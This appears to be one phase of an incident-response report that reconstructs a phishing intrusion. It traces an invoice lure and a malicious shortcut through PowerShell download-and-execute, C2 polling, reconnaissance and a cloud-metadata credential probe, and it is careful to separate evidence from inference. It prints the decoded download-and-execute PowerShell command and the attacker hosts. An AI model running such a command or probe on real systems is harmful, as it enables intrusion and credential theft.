# Phase 05 — Attack Chain Reconstruction

## Summary

The email, shortcut metadata, PowerShell logs, and packet capture are consistent with an invoice-themed lure leading to hidden PowerShell execution, remote content retrieval, recurring HTTP communications, and host reconnaissance. The chain below separates direct observations from interpretations.

## Correlated sequence

1. **Invoice lure received — 2023-01-13 09:25 UTC.** `dump.eml` shows an invoice/collections-themed message from `agriffin@bpakcaging.xyz` to Julianne Westcott, referencing invoice `#39586972`, a payment due date, and a password-protected `Invoice.zip`. The email authentication fields report SPF and DKIM passes for the displayed domain; this does not prove the message is benign or the sender is legitimate.
2. **Shortcut delivery — archive metadata.** `Invoice.zip` contains `Invoice_20230103.lnk` (2,344 bytes). The archive listing records the entry timestamp as 2023-01-13 16:51. This is file metadata, not proof of the exact time the recipient opened it.
3. **Encoded PowerShell recorded — 2023-01-13 17:10:07 UTC.** PowerShell event 4104, record 500, contains a hidden/encoded PowerShell download-and-execute pattern. The decoded command is `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`.
4. **Initial payload URL accessed — 17:10:09.751986 UTC.** The PCAP shows a GET to `files.bpakcaging.xyz/update`, corroborating the URL embedded in the LNK command.
5. **Recurring HTTP communications — from 17:10:10 UTC onward.** Requests to `cdn.bpakcaging.xyz:8080` include recurring GETs and POSTs to `/27fe2489`. Endpoint logs describe polling for commands and executing returned content. Multiple HTTP responses are `200`.
6. **Host reconnaissance and tool retrieval — approximately 17:14–17:16 UTC.** The PCAP shows a GET for `files.bpakcaging.xyz/sb.exe` at about 17:14:34 UTC. PowerShell logs later record Seatbelt-related commands. A separate HTTP POST body contains Windows process-listing output. These observations are consistent with reconnaissance; they do not prove every tool command completed successfully.
7. **Metadata-path probe — 17:17:19.666422 UTC.** A request to `169.254.169.254/latest/meta-data/iam/security-credentials/` received HTTP 404. This indicates a request was made but does not show credential retrieval.
8. **Repeated DNS lookups — at least 17:32:42–17:34:38 UTC.** The PCAP contains 88 unique long hexadecimal-label DNS queries under `bpakcaging.xyz`; matching responses returned NOERROR with zero answers. A partial HTTP POST decode contains lookup errors for these labels. The association is suspicious but does not establish DNS tunnelling.
9. **Later HTTP result submission — 17:34:39.953173 UTC.** TCP stream 1076 shows a POST to `159.89.205.40:8080`, URI `/27fe2489`, with a declared 78,618-byte body; the server responded `200` at 17:34:40.152293 UTC. The body was only partially decoded; successful exfiltration is not established.

## Assessment

**Overall assessment:** High confidence that the endpoint performed suspicious PowerShell execution and communicated repeatedly with suspicious infrastructure. The combined evidence is consistent with command-and-control and host reconnaissance.

**Not established from current artefacts:** successful credential theft, successful exfiltration, DNS tunnelling, persistence, the complete content of the downloaded payload, or full business impact.

## Evidence correlation cautions

- The email timestamp (09:25 UTC) and later endpoint/network activity (17:10 UTC onward) are on the same date but separated by several hours. Do not infer the exact user action time from the archive entry timestamp alone.
- SPF/DKIM results are domain authentication observations, not a verdict on sender legitimacy.
- A `200` response is not proof that data was accepted, interpreted, or used by an operator.
- Periodic requests to the cloud metadata `instance-action` path start before the suspicious PowerShell activity and should not be attributed to this chain without additional evidence.
